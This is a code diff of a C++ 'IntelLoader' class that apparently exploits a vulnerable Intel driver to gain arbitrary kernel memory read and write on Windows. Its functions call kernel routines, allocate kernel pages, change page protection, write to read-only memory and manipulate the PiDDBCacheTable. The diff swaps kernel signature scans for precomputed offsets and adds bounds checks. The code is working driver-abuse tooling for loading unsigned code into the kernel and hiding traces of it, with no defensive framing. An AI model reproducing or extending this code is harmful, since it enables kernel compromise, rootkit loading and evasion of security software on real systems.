@@ -49,7 +49,7 @@ BOOL IntelLoader::LoadVulnDriver()
 	// ImagePath using REG_EXPAND_SZ
 	status = RegSetKeyValueW(dservice, NULL, L"ImagePath", REG_EXPAND_SZ,
 		nPath.c_str(), (DWORD)(nPath.size() * sizeof(wchar_t)));
-	if (status != ERROR_SUCCESS) 
+	if (status != ERROR_SUCCESS)
 	{
 		RegCloseKey(dservice);
 		RegDeleteTreeW(HKEY_LOCAL_MACHINE, servicesPath.c_str());
@@ -85,7 +85,7 @@ BOOL IntelLoader::LoadVulnDriver()
 	BOOLEAN SeLoadDriverWasEnabled;
 	NTSTATUS ntStatus = RtlAdjustPrivilege(SE_LOAD_DRIVER_PRIVILEGE, TRUE, FALSE, &SeLoadDriverWasEnabled);
 
-	if (!NT_SUCCESS(ntStatus)) 
+	if (!NT_SUCCESS(ntStatus))
 	{
 		RegDeleteTreeW(HKEY_LOCAL_MACHINE, servicesPath.c_str());
 		std::cout << "[-] Failed to acquire SE_LOAD_DRIVER_PRIVILEGE\n";
@@ -206,7 +206,21 @@ BOOL IntelLoader::OpenDevice()
 BOOL IntelLoader::MemoryCopy(uint64_t destination, uint64_t source, uint64_t size) const
 {
 	if (!destination || !source || !size)
-		return 0;
+		return FALSE;
+
+	if (!IsCanonicalAddress(destination) || !IsCanonicalAddress(source))
+	{
+		LOG_ERROR("Critical error. Address not in kernel range, aborting copy.");
+		return FALSE;
+	}
+
+
+	const uint64_t MAX_COPY_SIZE = 1024 * 1024 * 1024;
+	if (size > MAX_COPY_SIZE)
+	{
+		LOG_ERROR("Copy size too large: " << size << " bytes");
+		return FALSE;
+	}
 
 	COPY_MEMORY_BUFFER_INFO copy_memory_buffer = { 0 };
 
@@ -219,10 +233,27 @@ BOOL IntelLoader::MemoryCopy(uint64_t destination, uint64_t source, uint64_t siz
 	return DeviceIoControl(hIntelDriver, ioctl1, &copy_memory_buffer, sizeof(copy_memory_buffer), nullptr, 0, &bytes_returned, nullptr);
 }
 
+
+
 BOOL IntelLoader::SetMemory(uint64_t address, uint32_t value, uint64_t size) const
 {
 	if (!address || !size)
-		return 0;
+		return FALSE;
+
+	// Range check
+	if (!IsCanonicalAddress(address))
+	{
+		LOG_ERROR("Critical error. Address not in kernel range, aborting operation.");
+		return FALSE;
+	}
+
+	// Overflow check
+	const uint64_t MAX_COPY_SIZE = 1024 * 1024 * 1024;
+	if (size > MAX_COPY_SIZE)
+	{
+		LOG_ERROR("Copy size too large: " << size << " bytes");
+		return FALSE;
+	}
 
 	FILL_MEMORY_BUFFER_INFO fill_memory_buffer = { 0 };
 
@@ -232,13 +263,22 @@ BOOL IntelLoader::SetMemory(uint64_t address, uint32_t value, uint64_t size) con
 	fill_memory_buffer.length = size;
 
 	DWORD bytes_returned = 0;
+
 	return DeviceIoControl(hIntelDriver, ioctl1, &fill_memory_buffer, sizeof(fill_memory_buffer), nullptr, 0, &bytes_returned, nullptr);
 }
 
 BOOL IntelLoader::GetPhysicalAddress(uint64_t address, uint64_t* out_physical_address) const
 {
 	if (!address)
-		return 0;
+		return FALSE;
+
+	if (!IsCanonicalAddress(address))
+	{
+		LOG_ERROR("Critical error. Address not in kernel range, aborting operation.");
+		return FALSE;
+	}
+
+
 
 	GET_PHYS_ADDRESS_BUFFER_INFO get_phys_address_buffer = { 0 };
 
@@ -248,16 +288,18 @@ BOOL IntelLoader::GetPhysicalAddress(uint64_t address, uint64_t* out_physical_ad
 	DWORD bytes_returned = 0;
 
 	if (!DeviceIoControl(hIntelDriver, ioctl1, &get_phys_address_buffer, sizeof(get_phys_address_buffer), nullptr, 0, &bytes_returned, nullptr))
-		return false;
+		return FALSE;
 
 	*out_physical_address = get_phys_address_buffer.return_physical_address;
-	return true;
+	return TRUE;
 }
 
 UINT64 IntelLoader::MapIoSpace(uint64_t physical_address, uint32_t size) const
 {
 	if (!physical_address || !size)
 		return 0;
+
+
 
 	MAP_IO_SPACE_BUFFER_INFO map_io_space_buffer = { 0 };
 
@@ -293,15 +335,12 @@ BOOL IntelLoader::ExFreePool(uint64_t address)
 {
 	if (!address) return false;
 
-	static uint64_t exFreePoolAddress = GetKernelModuleExport(ntoskrnlBaseAddress, "ExFreePool");
+	static uint64_t exFreePoolAddress = m_offsets.ExFreePool;
 	if (!exFreePoolAddress)
 	{
 		LOG_ERROR("ExFreePool export not found");
 		return false;
 	}
-
-
-	LOG_SUCCESS_HEX("ExFreePool -> ", exFreePoolAddress);
 
 	return CallKernelFunction<void>(ntoskrnlBaseAddress, nullptr, exFreePoolAddress, address);
 }
@@ -319,14 +358,12 @@ BOOL IntelLoader::ExReleaseResourceLite(PVOID resource)
 		return FALSE;
 	}
 
-	UINT64 address = GetKernelModuleExport(ntoskrnlBaseAddress, "ExReleaseResourceLite");
+	UINT64 address = m_offsets.ExReleaseResourceLite;
 	if (!address)
 	{
 		LOG_ERROR("ExReleaseResourceLite export not found");
 		return FALSE;
 	}
-
-	LOG_SUCCESS_HEX("ExReleaseResourceLite : ", address);
 
 
 	return CallKernelFunction<void>(ntoskrnlBaseAddress, nullptr, address, resource);
@@ -337,7 +374,7 @@ BOOL IntelLoader::ExAcquireResourceExclusiveLite(PVOID Resource, BOOLEAN Wait)
 	if (!ntoskrnlBaseAddress)
 		SetKernelBaseAddress();
 
-	UINT64 address = GetKernelModuleExport(ntoskrnlBaseAddress, "ExAcquireResourceExclusiveLite");
+	UINT64 address = m_offsets.ExAcquireResourceExclusiveLite;
 	if (!address)
 	{
 		LOG_ERROR("Error, failed to get ExAcquireResourceExclusiveLite export");
@@ -349,62 +386,18 @@ BOOL IntelLoader::ExAcquireResourceExclusiveLite(PVOID Resource, BOOLEAN Wait)
 
 }
 
-PVOID IntelLoader::GetPiDDBLock()
+PVOID IntelLoader::GetPiDDBLock() const
 {
-	if (!ntoskrnlBaseAddress) SetKernelBaseAddress();
-	if (!ntoskrnlBaseAddress) return nullptr;
-
-
-
-
-	// 1st
-	uintptr_t ref = FindPatternInSectionAtKernel((char*)"PAGE", ntoskrnlBaseAddress,
-		(BYTE*)"\x8B\xD8\x85\xC0\x0F\x88\x00\x00\x00\x00\x65\x48\x8B\x04\x25\x00\x00\x00\x00\x66\xFF\x88\x00\x00\x00\x00\xB2\x01\x48\x8D\x0D",
-		(char*)"xxxxxx????xxxxx????xxx????xxxxx????");
-	if (!ref) 
-	{
-		// 2nd (build 22449+)
-		ref = FindPatternInSectionAtKernel((char*)"PAGE", ntoskrnlBaseAddress,
-			(BYTE*)"\x48\x8B\x0D\x00\x00\x00\x00\x48\x85\xC9\x0F\x85\x00\x00\x00\x00\x48\x8D\x0D",
-			"xxx????xxxxx????xxx????");
-		if (ref) ref += 16;
-		else 
-		{
-			// 3rd pattern (build 26100+)
-			ref = FindPatternInSectionAtKernel((char*)"PAGE", ntoskrnlBaseAddress,
-				(BYTE*)"\x8B\xD8\x85\xC0\x0F\x88\x00\x00\x00\x00\x65\x48\x8B\x04\x25\x00\x00\x00\x00\x48\x8D\x0D",
-				(char*)"xxxxxx????xxxxx????xxx????");
-			if (ref) ref += 19;
-		}
-	}
-	else ref += 28;
-
-	if (!ref) { LOG_ERROR("PiDDBLock pattern not found"); return nullptr; }
-
-	PVOID lock = ResolveRelativeAddress((PVOID)ref, 3, 7);
-	LOG_SUCCESS_HEX("PiDDBLock resolved : ", (uintptr_t)lock);
+	
+	PVOID lock = (PVOID)m_offsets.PiDDBLock;
 	return lock;
 }
 
 
-PRTL_AVL_TABLE IntelLoader::GetPiDDBCacheTable()
+PRTL_AVL_TABLE IntelLoader::GetPiDDBCacheTable() const
 {
-	if (!ntoskrnlBaseAddress) SetKernelBaseAddress();
-	if (!ntoskrnlBaseAddress) return nullptr;
 
-
-	uintptr_t ref = FindPatternInSectionAtKernel((char*)"PAGE", ntoskrnlBaseAddress,
-		(BYTE*)"\x66\x03\xD2\x48\x8D\x0D", (char*)"xxxxxx");
-	if (!ref) 
-	{
-		ref = FindPatternInSectionAtKernel((char*)"PAGE", ntoskrnlBaseAddress,
-			(BYTE*)"\x48\x8B\xF9\x33\xC0\x48\x8D\x0D", (char*)"xxxxxxxx");
-		if (ref) ref += 2;
-	}
-	if (!ref) { LOG_ERROR("PiDDBCacheTable pattern not found"); return nullptr; }
-
-	PRTL_AVL_TABLE table = (PRTL_AVL_TABLE)ResolveRelativeAddress((PVOID)ref, 6, 10);
-	LOG_SUCCESS_HEX("PiDDBCacheTable resolved : ", (uintptr_t)table);
+	PRTL_AVL_TABLE table = (PRTL_AVL_TABLE)m_offsets.PiDDBCacheTable;
 	return table;
 }
 
@@ -413,7 +406,7 @@ BOOLEAN IntelLoader::RtlDeleteElementGenericTableAvl(PVOID table, PVOID buffer)
 	if (!ntoskrnlBaseAddress)
 		SetKernelBaseAddress();
 
-	UINT64 address = GetKernelModuleExport(ntoskrnlBaseAddress, "RtlDeleteElementGenericTableAvl");
+	UINT64 address = m_offsets.RtlDeleteElementGenericTableAvl;
 	if (!address)
 	{
 		LOG_ERROR("Error failed to get RtlDeleteElementGenericTableAvl export");
@@ -432,14 +425,13 @@ PVOID IntelLoader::RtlLookupElementGenericTableAvl(PRTL_AVL_TABLE Table, PVOID B
 	if (!ntoskrnlBaseAddress)
 		SetKernelBaseAddress();
 
-	UINT64 address = GetKernelModuleExport(ntoskrnlBaseAddress, "RtlLookupElementGenericTableAvl");
+	UINT64 address = m_offsets.RtlLookupElementGenericTableAvl;
 	if (!address)
 	{
 		LOG_ERROR("RtlLookupElementGenericTableAvl not found in exports");
 		return nullptr;
 	}
 
-	LOG_SUCCESS_HEX("RtlLookupElementGenericTableAvl resolved :  ", address);
 
 	PVOID result = nullptr;
 	CallKernelFunction(ntoskrnlBaseAddress, &result, address, Table, Buffer);
@@ -465,7 +457,7 @@ PiDDBCacheEntry* IntelLoader::LookupEntry(PRTL_AVL_TABLE PiDDBCacheTable, ULONG 
 	std::vector<wchar_t> nameBuffer(name, name + nameLen / sizeof(wchar_t) + 1);
 	searchEntry.DriverName.Buffer = nameBuffer.data();
 
-	
+
 	PVOID result = RtlLookupElementGenericTableAvl(PiDDBCacheTable, &searchEntry);
 	if (result)
 		LOG_SUCCESS("LookupEntry found our driver entry");
@@ -483,7 +475,7 @@ PVOID IntelLoader::RtlEnumerateGenericTableWithoutSplayingAvl(PRTL_AVL_TABLE Tab
 	if (!ntoskrnlBaseAddress)
 		SetKernelBaseAddress();
 
-	UINT64 address = GetKernelModuleExport(ntoskrnlBaseAddress, "RtlEnumerateGenericTableWithoutSplayingAvl");
+	UINT64 address = m_offsets.RtlEnumerateGenericTableWithoutSplayingAvl;
 	if (!address)
 	{
 		LOG_ERROR("RtlEnumerateGenericTableWithoutSplayingAvl not found in exports");
@@ -497,18 +489,18 @@ PVOID IntelLoader::RtlEnumerateGenericTableWithoutSplayingAvl(PRTL_AVL_TABLE Tab
 }
 
 
-BOOL IntelLoader::ReadMemory(uint64_t address, void* buffer, uint64_t size)
+BOOL IntelLoader::ReadMemory(uint64_t address, void* buffer, uint64_t size) const
 {
 	return MemoryCopy(reinterpret_cast<uint64_t>(buffer), address, size);
 
 }
 
-BOOL IntelLoader::WriteMemory(uint64_t address, void* buffer, uint64_t size)
+BOOL IntelLoader::WriteMemory(uint64_t address, void* buffer, uint64_t size) const
 {
 	return MemoryCopy(address, reinterpret_cast<uint64_t>(buffer), size);
 }
 
-BOOL IntelLoader::WriteToReadOnlyMemory(uint64_t address, void* buffer, uint32_t size)
+BOOL IntelLoader::WriteToReadOnlyMemory(uint64_t address, void* buffer, uint32_t size) const
 {
 	if (!address || !buffer || !size)
 		return false;
@@ -535,7 +527,6 @@ BOOL IntelLoader::WriteToReadOnlyMemory(uint64_t address, void* buffer, uint32_t
 
 	return result;
 }
-
 
 
 
@@ -628,108 +619,8 @@ UINT64 IntelLoader::GetKernelModuleExport(uint64_t kernel_module_base, const std
 	return 0;
 }
 
-uintptr_t IntelLoader::FindPatternAtKernel(uintptr_t dwAddress, uintptr_t dwLen, BYTE* bMask, const char* szMask)
-{
-	if (!dwAddress)
-	{
-		LOG_ERROR("No module address to find pattern");
-		return 0;
-	}
 
-	if (dwLen > 1024 * 1024 * 1024)
-	{
-		LOG_ERROR("Can't find pattern, Too big section");
-		return 0;
-	}
-
-	auto sectionData = std::make_unique<BYTE[]>(dwLen);
-	if (!ReadMemory(dwAddress, sectionData.get(), dwLen)) {
-		LOG_ERROR("Read failed in FindPatternAtKernel");
-		return 0;
-	}
-
-	auto result = FindPattern((uintptr_t)sectionData.get(), dwLen, bMask, szMask);
-
-	if (result <= 0)
-	{
-		return 0;
-	}
-	result = dwAddress - (uintptr_t)sectionData.get() + result;
-	return result;
-}
-
-uintptr_t IntelLoader::FindSectionAtKernel(const char* sectionName, uintptr_t modulePtr, PULONG size)
-{
-	if (!modulePtr)
-		return 0;
-
-	BYTE headers[0x1000];
-	if (!ReadMemory(modulePtr, headers, 0x1000))
-	{
-		LOG_ERROR("Can't read module headers");
-		return 0;
-	}
-
-	PIMAGE_DOS_HEADER dosHeader = (PIMAGE_DOS_HEADER)headers;
-	if (dosHeader->e_magic != IMAGE_DOS_SIGNATURE)
-	{
-		LOG_ERROR("Invalid DOS signature");
-		return 0;
-	}
-
-	PIMAGE_NT_HEADERS64 ntHeaders = (PIMAGE_NT_HEADERS64)(headers + dosHeader->e_lfanew);
-	if (ntHeaders->Signature != IMAGE_NT_SIGNATURE)
-	{
-		LOG_ERROR("Invalid NT signature");
-		return 0;
-	}
-
-	PIMAGE_SECTION_HEADER section = IMAGE_FIRST_SECTION(ntHeaders);
-
-	for (WORD i = 0; i < ntHeaders->FileHeader.NumberOfSections; i++, section++)
-	{
-		char currentSectionName[9] = { 0 };
-		memcpy(currentSectionName, section->Name, 8);
-
-		if (strcmp(currentSectionName, sectionName) == 0)
-		{
-			if (size)
-				*size = section->Misc.VirtualSize;
-
-			std::wcout << L"[DEBUG] Found section " << sectionName
-				<< L" at RVA: 0x" << std::hex << section->VirtualAddress
-				<< L", Size: 0x" << section->Misc.VirtualSize << std::dec << std::endl;
-
-			return modulePtr + section->VirtualAddress;
-		}
-	}
-
-	LOG_ERROR("Section not found: " << sectionName);
-	return 0;
-}
-
-uintptr_t IntelLoader::FindPatternInSectionAtKernel(const char* sectionName, uintptr_t modulePtr, BYTE* bMask, const char* szMask)
-{
-	std::wcout << L"[DEBUG] FindPatternInSectionAtKernel - Section: " << sectionName
-		<< L", Module: 0x" << std::hex << modulePtr << std::dec << std::endl;
-
-	ULONG sectionSize = 0;
-	uintptr_t section = FindSectionAtKernel(sectionName, modulePtr, &sectionSize);
-
-	if (!section || !sectionSize)
-	{
-		LOG_ERROR("Failed to find section or section has zero size");
-		return 0;
-	}
-
-	std::wcout << L"[DEBUG] Section found at: 0x" << std::hex << section
-		<< L", Size: 0x" << sectionSize << std::dec << std::endl;
-
-	return FindPatternAtKernel(section, sectionSize, bMask, szMask);
-}
-
-
-PVOID IntelLoader::ResolveRelativeAddress(PVOID Instruction, ULONG OffsetOffset, ULONG InstructionSize)
+PVOID IntelLoader::ResolveRelativeAddress(PVOID Instruction, ULONG OffsetOffset, ULONG InstructionSize) const
 {
 	if (!Instruction)
 	{
@@ -739,7 +630,7 @@ PVOID IntelLoader::ResolveRelativeAddress(PVOID Instruction, ULONG OffsetOffset,
 
 	ULONG_PTR Instr = (ULONG_PTR)Instruction;
 
-	std::wcout << L"[DEBUG] Resolving relative address at: 0x" << std::hex << Instr
+	/*std::wcout << L"[DEBUG] Resolving relative address at: 0x" << std::hex << Instr
 		<< L", offset: " << OffsetOffset << L", instruction size: " << InstructionSize << std::dec << std::endl;
 
 	BYTE instructionBytes[16] = { 0 };
@@ -751,7 +642,7 @@ PVOID IntelLoader::ResolveRelativeAddress(PVOID Instruction, ULONG OffsetOffset,
 			std::wcout << std::hex << (int)instructionBytes[i] << L" ";
 		}
 		std::wcout << std::dec << std::endl;
-	}
+	}*/
 
 	LONG RipOffset = 0;
 	if (!ReadMemory(Instr + OffsetOffset, &RipOffset, sizeof(RipOffset)))
@@ -760,70 +651,22 @@ PVOID IntelLoader::ResolveRelativeAddress(PVOID Instruction, ULONG OffsetOffset,
 		return nullptr;
 	}
 
-	std::wcout << L"[DEBUG] Relative offset: " << std::hex << RipOffset << std::dec << std::endl;
+//	std::wcout << L"[DEBUG] Relative offset: " << std::hex << RipOffset << std::dec << std::endl;
 
 	PVOID resolvedAddress = (PVOID)(Instr + InstructionSize + RipOffset);
 
-	std::wcout << L"[DEBUG] Resolved address: 0x" << std::hex << resolvedAddress << std::dec << std::endl;
-
+	LOG_SUCCESS_HEX("Resolved address : ", resolvedAddress);
 	return resolvedAddress;
 }
 
 
-
-uint64_t IntelLoader::MmAllocateIndependentPagesEx(uint32_t size)
+UINT64 IntelLoader::MmAllocateIndependentPagesEx(uint32_t size)
 {
-	if (!ntoskrnlBaseAddress)
-	{
-		SetKernelBaseAddress();
-		if (!ntoskrnlBaseAddress)
-		{
-			LOG_ERROR("Failed to get kernel base address");
-			return 0;
-		}
-	}
+	if (!size)
+		return 0;
 
-	static uint64_t kernel_MmAllocateIndependentPagesEx = 0;
+	UINT64 kernel_MmAllocateIndependentPagesEx = m_offsets.MmAllocateIndependentPagesEx;
 
-		if (!kernel_MmAllocateIndependentPagesEx)
-		{
-			LOG_INFO("Searching for MmAllocateIndependentPageEx pattern...");
-
-			// Found in KDMapper codebase. Working fine.
-		   // Updated, tested from 1803 to 24H2
-		  // KeAllocateInterrupt -> 41 8B D6 B9 00 10 00 00 E8 ?? ?? ?? ?? 48 8B D8
-			kernel_MmAllocateIndependentPagesEx = FindPatternInSectionAtKernel(
-				(char*)".text",
-				ntoskrnlBaseAddress,
-				(BYTE*)"\x41\x8B\xD6\xB9\x00\x10\x00\x00\xE8\x00\x00\x00\x00\x48\x8B\xD8",
-				(char*)"xxxxxxxxx????xxx");
-
-	
-
-
-			if (!kernel_MmAllocateIndependentPagesEx)
-			{
-				LOG_ERROR("Pattern search failed for MmAllocateIndependentPagesEx");
-				return 0;
-			}
-
-			// Go to E8 (call)
-			kernel_MmAllocateIndependentPagesEx += 8;
-
-			kernel_MmAllocateIndependentPagesEx = (uint64_t)ResolveRelativeAddress(
-				(PVOID)kernel_MmAllocateIndependentPagesEx,
-				1,
-				5);
-
-			if (!kernel_MmAllocateIndependentPagesEx)
-			{
-				LOG_ERROR("Failed to resolve relative address for MmAllocateIndependentPagesEx");
-				return 0;
-			}
-		}
-
-		LOG_SUCCESS_HEX("MmAllocateIndependentPagesEx resolved at : ",kernel_MmAllocateIndependentPagesEx);
-	
 
 	uint64_t out = 0;
 	bool success = CallKernelFunction(ntoskrnlBaseAddress, &out, kernel_MmAllocateIndependentPagesEx,
@@ -836,65 +679,22 @@ uint64_t IntelLoader::MmAllocateIndependentPagesEx(uint32_t size)
 	}
 
 	LOG_SUCCESS_HEX("MmAllocateIndependentPagesEx allocated : ", out);
+
 	return out;
 }
+
+
 
 BOOLEAN IntelLoader::MmFreeIndependentPages(uint64_t addr, uint32_t size)
 {
 	if (!addr || !size)
 		return false;
 
-	if (!ntoskrnlBaseAddress)
-	{
-		SetKernelBaseAddress();
-		if (!ntoskrnlBaseAddress)
-		{
-			LOG_ERROR("Failed to get kernel base address");
-			return false;
-		}
-	}
-
-	static uint64_t kernel_MmFreeIndependentPages = 0;
-
-	if (!kernel_MmFreeIndependentPages)
-	{
-		LOG_INFO("Searching for MmFreeIndependentPages pattern...");
 
 
-		if (!kernel_MmFreeIndependentPages)
-		{
+	UINT64 kernel_MmFreeIndependentPages = m_offsets.MmFreeIndependentPages;
+	
 
-			// Pattern from KDMapper
-			kernel_MmFreeIndependentPages = FindPatternInSectionAtKernel(
-				(char*)"PAGE",
-				ntoskrnlBaseAddress,
-				(BYTE*)"\xBA\x00\x60\x00\x00\x48\x8B\xCB\xE8\x00\x00\x00\x00\x48\x8D\x8B\x00\xF0\xFF\xFF",
-				(char*)"xxxxxxxxx????xxxxxxx");
-
-			if (!kernel_MmFreeIndependentPages)
-			{
-				LOG_ERROR("Pattern search failed for MmFreeIndependentPages");
-				return false;
-			}
-
-			// Move to the call (E8)
-			kernel_MmFreeIndependentPages += 8;
-
-			// Resolve relative address
-			kernel_MmFreeIndependentPages = (uint64_t)ResolveRelativeAddress(
-				(PVOID)kernel_MmFreeIndependentPages,
-				1,
-				5);
-
-			if (!kernel_MmFreeIndependentPages)
-			{
-				LOG_ERROR("Failed to resolve relative address for MmFreeIndependentPages");
-				return false;
-			}
-		}
-
-		LOG_SUCCESS_HEX("MmFreeIndependentPages resolved to : ", kernel_MmFreeIndependentPages);
-	}
 
 	uint64_t dummy = 0;
 	bool success = CallKernelFunction(ntoskrnlBaseAddress, &dummy, kernel_MmFreeIndependentPages, addr, size);
@@ -913,69 +713,9 @@ BOOLEAN IntelLoader::MmSetPageProtection(uint64_t address, uint32_t size, ULONG 
 	if (!address || !size)
 		return false;
 
-	if (!ntoskrnlBaseAddress)
-	{
-		SetKernelBaseAddress();
-		if (!ntoskrnlBaseAddress)
-		{
-			LOG_ERROR("Failed to get kernel base address");
-			return false;
-		}
-	}
+	UINT64 kernel_MmSetPageProtection = m_offsets.MmSetPageProtection;
 
-	static uint64_t kernel_MmSetPageProtection = 0;
-
-	if (!kernel_MmSetPageProtection)
-	{
-		LOG_INFO("Searching pattern for MmSetPageProtection...");
-
-		if (!kernel_MmSetPageProtection)
-		{
-			// Pattern from KDMapper – tested 1803 to 24H2
-			kernel_MmSetPageProtection = FindPatternInSectionAtKernel(
-				(char*)"PAGELK",
-				ntoskrnlBaseAddress,
-				(BYTE*)"\x0F\x45\x00\x00\x8D\x00\x00\x00\xFF\xFF\xE8",
-				(char*)"xx??x???xxx");
-
-			if (!kernel_MmSetPageProtection)
-			{
-
-				kernel_MmSetPageProtection = FindPatternInSectionAtKernel(
-					(char*)"PAGELK",
-					ntoskrnlBaseAddress,
-					(BYTE*)"\x0F\x45\x00\x00\x45\x8B\x00\x00\x00\x00\x8D\x00\x00\x00\x00\x00\x00\xFF\xFF\xE8",
-					(char*)"xx??xx????x???xxx");
-
-				if (!kernel_MmSetPageProtection)
-				{
-					LOG_ERROR("MmSetPageProtection pattern not found");
-					return false;
-				}
-
-				kernel_MmSetPageProtection += 13;
-			}
-			else
-			{
-				kernel_MmSetPageProtection += 10;
-			}
-
-			// Resolve relative call
-			kernel_MmSetPageProtection = (uint64_t)ResolveRelativeAddress(
-				(PVOID)kernel_MmSetPageProtection,
-				1,
-				5);
-
-			if (!kernel_MmSetPageProtection)
-			{
-				LOG_ERROR("Failed to resolve MmSetPageProtection");
-				return false;
-			}
-		}
-
-		LOG_SUCCESS_HEX("MmSetPageProtection resolved : ", kernel_MmSetPageProtection);
-	}
-
+	
 	BOOLEAN out = FALSE;
 	bool success = CallKernelFunction(ntoskrnlBaseAddress, &out, kernel_MmSetPageProtection, address, size, new_protect);
 
@@ -1029,4 +769,3 @@ IntelLoader::~IntelLoader()
 	ntoskrnlBaseAddress = 0;
 
 }
-
